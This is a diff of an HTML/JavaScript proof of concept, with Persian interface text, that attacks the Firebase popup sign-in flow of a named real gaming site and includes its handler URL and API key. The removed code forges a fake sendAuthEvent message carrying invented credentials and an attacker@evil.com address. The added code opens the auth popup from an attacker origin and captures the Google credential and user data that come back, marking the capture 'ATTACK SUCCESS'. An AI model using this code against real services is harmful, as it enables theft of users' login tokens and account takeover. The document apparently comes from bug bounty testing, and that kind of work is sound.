@@ -2,30 +2,23 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>Firebase PostMessage PoC - Bug Bounty</title>
-  <style>
-    body { font-family: Arial; padding: 20px; background: #111; color: #0f0; direction: rtl; }
-    button { padding: 12px 20px; font-size: 16px; margin: 10px; }
-    pre { background: #222; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; }
-  </style>
+  <title>Firebase Popup Hijack PoC</title>
+  <style>body { font-family: Arial; padding: 20px; }</style>
 </head>
 <body>
 
-  <h2>Firebase Auth Handler PostMessage PoC</h2>
-  <p>سایت هدف: <b>https://www.cloudgaming002.com</b></p>
+  <h2>Firebase Popup Hijack Attack</h2>
+  <input type="text" id="handlerUrl" style="width: 90%; padding: 10px;" 
+         value="https://iam.cldbt.cloud/__/auth/handler?apiKey=AIzaSyBno_U0VgS_Pl1ayb41cqKNL5wFtB5zLio&appName=%5BDEFAULT%5D&authType=signInViaPopup&redirectUrl=https%3A%2F%2Fwww.cloudgaming002.com%2Fen%2Fauth%2Fsign-in&providerId=google.com" />
 
-  <input type="text" id="handlerUrl" value="https://iam.cldbt.cloud/__/auth/handler?apiKey=AIzaSyBno_U0VgS_Pl1ayb41cqKNL5wFtB5zLio&appName=%5BDEFAULT%5D&authType=signInViaPopup&redirectUrl=https%3A%2F%2Fwww.cloudgaming002.com%2Fen%2Fauth%2Fsign-in&v=12.12.0&eventId=7530990138&providerId=google.com&scopes=profile%2Chttps%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email" style="width: 90%; padding: 10px;" />
   <br><br>
+  <button onclick="openPopup()">باز کردن Popup از Origin Attacker</button>
 
-  <button onclick="openHandlerPopup()">1. باز کردن Popup Handler</button>
-  <button onclick="sendFakeAuthEvent()">2. ارسال پیام جعلی (sendAuthEvent)</button>
-
-  <h3>لاگ دریافتی‌ها:</h3>
+  <h3>دریافتی‌ها (Auth Event):</h3>
   <pre id="log"></pre>
 
   <script>
     const logEl = document.getElementById('log');
-    let popup = null;
 
     function log(msg) {
       const time = new Date().toLocaleTimeString('fa-IR');
@@ -33,58 +26,42 @@
       console.log(msg);
     }
 
-    function openHandlerPopup() {
+    let popup = null;
+
+    function openPopup() {
       const url = document.getElementById('handlerUrl').value;
-      popup = window.open(url, "firebasePopup", "width=700,height=750,scrollbars=yes,resizable=yes");
-      log("🔄 Popup Handler باز شد");
-    }
+      
+      popup = window.open(
+        url,
+        "firebasePopup",
+        "width=700,height=750,scrollbars=yes"
+      );
 
-    // دریافت همه پیام‌ها
-    window.addEventListener('message', function(e) {
-      log(`📨 پیام از: <b>${e.origin}</b>`);
-      log(`نوع: <b>${e.data?.eventType || 'نامشخص'}</b>`);
-
-      if (e.data) {
-        console.dir(e.data);
-        if (e.data.eventType === "sendAuthEvent") {
-          log("🔥 <b>sendAuthEvent دریافت شد!</b>");
-          log("داده: " + JSON.stringify(e.data.data, null, 2));
-        }
-      }
-    });
-
-    // ارسال پیام جعلی
-    function sendFakeAuthEvent() {
-      if (!popup || popup.closed) {
-        alert("ابتدا Popup را باز کنید!");
+      if (!popup) {
+        log("❌ Popup مسدود شد! پاپ‌آپ بلاکر را خاموش کنید.");
         return;
       }
 
-      const fakeData = {
-        eventType: "sendAuthEvent",
-        eventId: "7530990138",
-        data: {
-          operationType: "signIn",
-          credential: {
-            providerId: "google.com",
-            accessToken: "fake_token_123456",
-            idToken: "fake_id_token"
-          },
-          user: {
-            uid: "fake_uid_123",
-            email: "attacker@evil.com",
-            displayName: "Hacked User"
-          },
-          additionalUserInfo: {
-            providerId: "google.com",
-            isNewUser: false
-          }
-        }
-      };
-
-      popup.postMessage(fakeData, "*");   // targetOrigin = *
-      log("🚀 پیام جعلی sendAuthEvent ارسال شد!");
+      log("✅ Popup از origin attacker باز شد");
     }
+
+    // گوش دادن به همه postMessageها
+    window.addEventListener('message', function(e) {
+      log(`📨 پیام از: <b>${e.origin}</b>`);
+
+      if (e.data && e.data.eventType) {
+        log(`✅ eventType: <b>${e.data.eventType}</b>`);
+
+        if (e.data.eventType === "sendAuthEvent") {
+          log("🔥 <b>sendAuthEvent دریافت شد! (داده مهم)</b>");
+          log("Credential: " + JSON.stringify(e.data.data.credential, null, 2));
+          log("User: " + JSON.stringify(e.data.data.user, null, 2));
+          
+          // اینجا attacker می‌تواند credential را ذخیره کند
+          console.log("=== ATTACK SUCCESS ===", e.data.data);
+        }
+      }
+    });
 
     // چک کردن بسته شدن popup
     setInterval(() => {
@@ -94,6 +71,5 @@
       }
     }, 1000);
   </script>
-
 </body>
 </html>
